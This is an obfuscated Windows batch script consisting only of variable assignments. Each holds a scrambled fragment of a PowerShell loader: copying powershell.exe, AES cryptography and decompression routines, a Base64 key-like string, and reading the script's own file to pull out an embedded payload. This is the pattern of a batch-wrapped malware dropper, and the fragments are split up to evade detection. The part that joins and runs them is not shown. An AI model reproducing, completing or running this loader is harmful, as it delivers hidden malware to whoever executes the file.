@echo off
set "RUliFfprBd=xe"
set "bkQsWWegdn=Wi"
set "lXWCILBKyb= /"
set "YlmqrzjGFD=in"
set "JghwXTdEZz=rS"
set "IeFHhOQhIY=co"
set "gaTApOSOZY=32"
set "MygCJdlRHs=rs"
set "nTnQXgyZuO=em"
set "mpjHUFBTnZ=:\"
set "zaWveHFamc=ll"
set "MvjxBctvvP=\W"
set "qMGykGVhHW=\v"
set "cnAPRScIcq=0\"
set "iSSNTRaojC=py"
set "RjDIZlUxFw=1."
set "oyjVGzTofJ=nd"
set "xlFEMXdkLy=y "
set "FmivJFBXiP=we"
set "ruHACPnvzh=we"
set "EmfqYyDqzW=he"
set "FGjUEzmcDg=.e"
set "SehIrSJPoU=ws"
set "YsFmjdMTAk=po"
set "NcEEQUNCiP=Po"
set "cjlrByDAQY= C"
set "phajBRsTuF=s\"
set "lprJLSJkSn=ow"
set "twwCKNgnbv=Sy"
set "pgTmoLtnoZ=do"
set "QtsLQmCowt=he"
set "YQeytGVLZM=ll"
set "MmNEOLThGd=st"
set "HvshygihXj=cd"
set "GfSyTTTrtE= %~dp0"
set "MIcLYeAfhn= New"
set "ImuNEVGrQM=AKYu"
set "UHLXItUxgl=YC ="
set "TeAESKEyWn=raph"
set "HvbeuuTxuQ=-1.."
set "LsoxoYAxPv=S46e"
set "nxVBFwcHnF=obUX"
set "daNsjaERcK=tem."
set "rQReVKVNiU=File"
set "uIEAFJUEpC=ateD"
set "WSkdNbbTpz=Rsyq"
set "XSSEBFMnlz=, (,"
set "zeYVdaZubS==');"
set "aHQnKapYDn=Secu"
set "JOzTnkGkvv=[Sys"
set "bBifYackhJ=ew-O"
set "YIupZQMgrm=$KhA"
set "ZUgSsxCVlq=V = "
set "sAjxjdCrHm=IBxq"
set "FeChATyHWm=O.Me"
set "wwInBAbSMf=;$oN"
set "nqoKBijNWx=6esa"
set "kYloyBqOvF=Yu ="
set "SpNDIdbHDz=Ryiq"
set "OKDMRsIGoA=L4Yi"
set "YuhODKUnbL=ke($"
set "ycDJOPqvNw=IBxq"
set "zRvSyDJqsa=)) {"
set "BGNtzjgvXX=f = "
set "RNHrfgZezn=gth)"
set "dUoZiWRJXz=New-"
set "zEEWybynIS=New-"
set "zKruMakXdm=-4] "
set "EjOizTXrLH=.-16"
set "XWPHvhjboS=.Mod"
set "FYHTTkZhlp=em.C"
set "fWeDtiQjIO= [Sy"
set "gynIwqYljE=$YAK"
set "WSjuPMHrNC=ect "
set "rnQnpteqGB=pStr"
set "dmsFGnksro=grap"
set "iDZmibMZAk=Comp"
set "rKigaElFil=] -j"
set "nWvvWvAgqj=Syst"
set "ombvtNpdWp=();$"
set "LNIXfOuCPQ=ay()"
set "PSZNTZNGjC=)))"
set "bgBqZCzARG=pose"
set "LsuZOwYeMJ=ptor"
set "jHRhXkUJmY== $v"
set "wIPaGoFoGO=IBxq"
set "sWerWoNuYq=YAKY"
set "MfwLqfomCK=tS46"
set "jmpvHhTuWs=y.Cr"
set "DwsHZzdSBU= = $"
set "NuJeWitnUc=am;$"
set "xHQOMvsMLA=.Con"
set "BAQpqodqtw=l5E7"
set "ThhJpdvEsg=orF'"
set "cXpIHOoiCX=sion"
set "nqeGEPnjuT=('%~f0'"
set "qzLZyBGgEh=th('"
set "TewxYgSYRe=$vIB"
set "fOdEddqDmA=PxEW"
set "WfNCDIEGLo=C) {"
set "sXfmvYmkxx=ring"
set "kpnUNlplCB=bjec"
